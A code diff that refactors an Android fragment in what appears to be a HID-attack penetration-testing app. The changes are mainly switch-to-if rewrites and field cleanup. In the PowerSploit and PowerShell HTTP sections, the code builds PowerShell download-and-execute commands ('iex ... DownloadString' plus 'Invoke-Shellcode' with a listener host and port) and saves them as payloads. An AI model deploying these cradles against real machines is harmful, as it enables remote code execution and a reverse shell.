@@ -1,5 +1,6 @@
 package material.hunter;
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Context;
@@ -46,7 +47,6 @@ public class HidFragment extends Fragment {
     private ViewPager mViewPager;
     private SharedPreferences sharedpreferences;
     private String configFilePath;
-    private Context context;
     private Activity activity;
     private boolean isHIDenable = false;
 
@@ -61,7 +61,6 @@ public class HidFragment extends Fragment {
     @Override
     public void onCreate(@Nullable Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        context = getContext();
         activity = getActivity();
     }
 
@@ -92,11 +91,7 @@ public class HidFragment extends Fragment {
 
     public void onPrepareOptionsMenu(Menu menu) {
         int pageNum = mViewPager.getCurrentItem();
-        if (pageNum == 0) {
-            menu.findItem(R.id.source_button).setVisible(true);
-        } else {
-            menu.findItem(R.id.source_button).setVisible(false);
-        }
+        menu.findItem(R.id.source_button).setVisible(pageNum == 0);
         activity.invalidateOptionsMenu();
     }
 
@@ -325,15 +320,13 @@ public class HidFragment extends Fragment {
     }
 
     public static class PowerSploitFragment extends Fragment implements OnClickListener {
-        private Context context;
-        private String configFilePath;
         private String configFileUrlPath;
 
         @Override
         public void onCreate(@Nullable Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
-            context = getContext();
-            configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
+            Context context = getContext();
+            String configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
             configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-url";
         }
 
@@ -348,31 +341,28 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powersploitOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    TextInputEditText ip = getView().findViewById(R.id.ipaddress);
-                    TextInputEditText port = getView().findViewById(R.id.port);
-                    TextInputEditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+            if (v.getId() == R.id.powersploitOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                TextInputEditText ip = getView().findViewById(R.id.ipaddress);
+                TextInputEditText port = getView().findViewById(R.id.port);
+                TextInputEditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
 
-                    Spinner payload = getView().findViewById(R.id.payload);
-                    String payloadValue = payload.getSelectedItem().toString();
+                Spinner payload = getView().findViewById(R.id.payload);
+                String payloadValue = payload.getSelectedItem().toString();
 
-                    String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
-                    NhPaths.showSnack(getView(), getString(R.string.edit_source_updated), 1);
+                String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
+                NhPaths.showSnack(getView(), getString(R.string.edit_source_updated), 1);
 
-                    boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        NhPaths.showSnack(getView(), "Source not updated (configFileUrlPath)", 1);
-                    }
-                    break;
-                default:
-                    NhPaths.showSnack(getView(), getString(R.string.unknown_click), 1);
-                    break;
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    NhPaths.showSnack(getView(), "Source not updated (configFileUrlPath)", 1);
+                }
+            } else {
+                NhPaths.showSnack(getView(), getString(R.string.unknown_click), 1);
             }
         }
 
@@ -559,28 +549,25 @@ public class HidFragment extends Fragment {
 
         @Override
         public void onActivityResult(int requestCode, int resultCode, Intent data) {
-            switch (requestCode) {
-                case PICKFILE_RESULT_CODE:
-                    if (resultCode == Activity.RESULT_OK && getView() != null) {
-                        String FilePath = data.getData().getPath();
-                        TextInputEditText source = getView().findViewById(R.id.windowsCmdSource);
-                        exe.ReadFile_ASYNC(FilePath, source);
-                        NhPaths.showSnack(getView(), getString(R.string.script_loaded), 1);
-                    }
-                    break;
+            if (requestCode == PICKFILE_RESULT_CODE) {
+                if (resultCode == Activity.RESULT_OK && getView() != null) {
+                    String FilePath = data.getData().getPath();
+                    TextInputEditText source = getView().findViewById(R.id.windowsCmdSource);
+                    exe.ReadFile_ASYNC(FilePath, source);
+                    NhPaths.showSnack(getView(), getString(R.string.script_loaded), 1);
+                }
             }
         }
     }
 
     public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
-        private Context context;
         private String configFilePath;
         private String configFileUrlPath;
 
         @Override
         public void onCreate(@Nullable Bundle savedInstanceState) {
             super.onCreate(savedInstanceState);
-            context = getContext();
+            Context context = getContext();
             configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-payload";
             configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-url";
         }
@@ -596,24 +583,21 @@ public class HidFragment extends Fragment {
         }
 
         public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powershellOptionsUpdate:
-                    if (getView() == null) {
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    TextInputEditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
-                    NhPaths.showSnack(getView(), getString(R.string.edit_source_updated), 1);
+            if (v.getId() == R.id.powershellOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                TextInputEditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
+                NhPaths.showSnack(getView(), getString(R.string.edit_source_updated), 1);
 
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved) {
-                        NhPaths.showSnack(getView(), "Source not updated (configFileUrlPath)", 1);
-                    }
-                    break;
-                default:
-                    NhPaths.showSnack(getView(), getString(R.string.unknown_click), 1);
-                    break;
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    NhPaths.showSnack(getView(), "Source not updated (configFileUrlPath)", 1);
+                }
+            } else {
+                NhPaths.showSnack(getView(), getString(R.string.unknown_click), 1);
             }
         }
 
